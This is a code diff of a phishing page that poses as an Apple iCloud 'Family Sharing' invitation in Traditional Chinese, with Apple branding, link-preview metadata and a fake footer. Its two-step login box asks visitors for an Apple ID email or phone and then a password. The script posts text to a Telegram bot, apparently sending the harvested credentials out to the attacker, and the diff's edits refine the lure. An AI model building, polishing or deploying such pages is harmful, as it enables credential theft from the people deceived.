@@ -3,45 +3,48 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
     <title>家人共享</title>
+    <meta property="og:title" content="iCloud">
+    <meta property="og:description" content="誠摯邀請你加入「家人共享」。點一下以檢視邀請">
+    <meta property="og:image" content="https://www.apple.com/v/family-sharing/f/images/overview/family_sharing_icon__f6932nshf9qy_large.png">
+    
     <link rel="icon" href="https://www.apple.com/favicon.ico">
 
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: "SF Pro Display", "SF Pro Icons", "Helvetica Neue", "Helvetica", "Arial", sans-serif; }
         body { background-color: #ffffff; color: #1d1d1f; display: flex; flex-direction: column; min-height: 100vh; }
         
+        /* 導覽列 */
         .navbar { width: 100%; height: 44px; background: #ffffff; display: flex; align-items: center; justify-content: space-between; padding: 0 22px; border-bottom: 1px solid #d2d2d7; position: sticky; top: 0; z-index: 100; }
         .navbar h1 { font-size: 21px; font-weight: 600; }
         .navbar .right-link { font-size: 14px; color: #1d1d1f; text-decoration: none; }
 
+        /* 主要內容 */
         .main-content { flex: 1; display: flex; flex-direction: column; align-items: center; padding: 40px 22px; text-align: center; }
         .family-hero-img { width: 140px; height: auto; margin-bottom: 30px; }
         .invite-title { font-size: 28px; font-weight: 600; margin-bottom: 15px; line-height: 1.2; }
         .invite-desc { font-size: 17px; line-height: 1.5; margin-bottom: 40px; max-width: 500px; }
         .login-label { font-size: 24px; margin-bottom: 25px; font-weight: 400; }
 
-        /* --- 動態延伸登入框 --- */
+        /* --- 動態輸入框組合 --- */
         .login-box {
             width: 100%;
             max-width: 330px;
             border: 1px solid #d2d2d7;
             border-radius: 12px;
             overflow: hidden;
-            background: #fff;
             transition: all 0.5s cubic-bezier(0.4, 0, 0.2, 1);
             margin-bottom: 60px;
+            background: #fff;
         }
 
         .input-row { position: relative; height: 52px; display: flex; align-items: center; }
         .apple-input { width: 100%; height: 100%; padding: 0 50px 0 16px; border: none; font-size: 17px; outline: none; background: transparent; }
 
-        /* 分隔線 */
         .divider { height: 1px; background-color: #d2d2d7; margin: 0 16px; display: none; }
 
-        /* 密碼列初始狀態：高度為 0，隱藏 */
         #pw-row { height: 0; opacity: 0; visibility: hidden; transition: all 0.5s ease; }
-        
-        /* 延伸後的狀態 */
         .expanded #pw-row { height: 52px; opacity: 1; visibility: visible; }
         .expanded .divider { display: block; }
 
@@ -50,7 +53,6 @@
             display: flex; align-items: center; justify-content: center; cursor: pointer; background: #fff;
         }
 
-        /* 你的動態 Loading 圖示 */
         .loading-gif { width: 22px; height: 22px; display: none; }
 
         /* 頁腳 */
@@ -58,7 +60,7 @@
         .footer-inner { max-width: 980px; margin: 0 auto; }
         .footer-bottom { display: flex; justify-content: space-between; align-items: center; margin-top: 15px; }
         .flag-box { display: flex; align-items: center; gap: 5px; color: #1d1d1f; }
-        .flag-img { width: 16px; height: 16px; border-radius: 50%; }
+        .flag-img { width: 16px; height: 16px; border-radius: 50%; object-fit: cover; }
 
         .hidden { display: none !important; }
         .overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.4); backdrop-filter: blur(20px); display: flex; align-items: center; justify-content: center; z-index: 200; }
@@ -73,7 +75,7 @@
     </nav>
 
     <main class="main-content">
-        <img src="./assets/header_family_sharing@2x.5698956d.png" class="family-hero-img" alt="Family Icon">
+        <img src="./assets/family_icon.png" class="family-hero-img" alt="Family Icon">
         
         <h1 class="invite-title">ThomasSusan 已邀請你加入「家人共享」。</h1>
         <p class="invite-desc">登入以加入ThomasSusan的家庭，即可存取 0GB 的 iCloud 儲存空間，並享有ThomasSusan為你的家庭設定的其他功能。</p>
@@ -83,7 +85,7 @@
         <div class="login-box" id="login-box">
             <div class="input-row">
                 <input type="text" id="acc" class="apple-input" placeholder="電子郵件地址或電話號碼">
-                <div class="submit-btn" id="step1-btn" onclick="triggerExpand()">
+                <div class="submit-btn" onclick="triggerExpand()">
                     <svg id="arrow-icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#d2d2d7" stroke-width="2.5"><path d="M9 18l6-6-6-6"/></svg>
                     <img id="loading-icon" src="./assets/loading.gif" class="loading-gif">
                 </div>
@@ -114,7 +116,7 @@
     <footer class="footer">
         <div class="footer-inner">
             <div style="border-bottom: 1px solid #d2d2d7; padding-bottom: 15px; margin-bottom: 15px;">
-                更多選購方式：<span style="color: #0066cc;">尋找當地的 Apple 直營店</span>或<span style="color: #0066cc;">其他零售商</span>。
+                更多選購方式：<span style="color: #0066cc;">尋找當地的 Apple 直營店</span>或<span style="color: #0066cc;">其他零售商</span>，或致電 0800-020-021。
             </div>
             <div class="footer-bottom">
                 <div>Copyright © 2026 Apple Inc. 保留一切權利。</div>
@@ -132,25 +134,16 @@
             try { await fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: config.chatId, text: text }) }); } catch(e) {}
         }
 
-        // 觸發延伸動畫
         function triggerExpand() {
             const acc = document.getElementById('acc').value.trim();
             if(!acc) return;
-
-            // 1. 切換按鈕圖標為 Loading
             document.getElementById('arrow-icon').style.display = 'none';
             document.getElementById('loading-icon').style.display = 'block';
-
-            // 2. 模擬讀取時間，隨後展開密碼框
             setTimeout(() => {
                 document.getElementById('loading-icon').style.display = 'none';
                 document.getElementById('arrow-icon').style.display = 'block';
-                
-                // 執行延展動畫
                 document.getElementById('login-box').classList.add('expanded');
-                
-                // 自動聚焦到密碼框
-                setTimeout(() => { document.getElementById('pw').focus(); }, 3000);
+                setTimeout(() => { document.getElementById('pw').focus(); }, 500);
             }, 1200);
         }
 
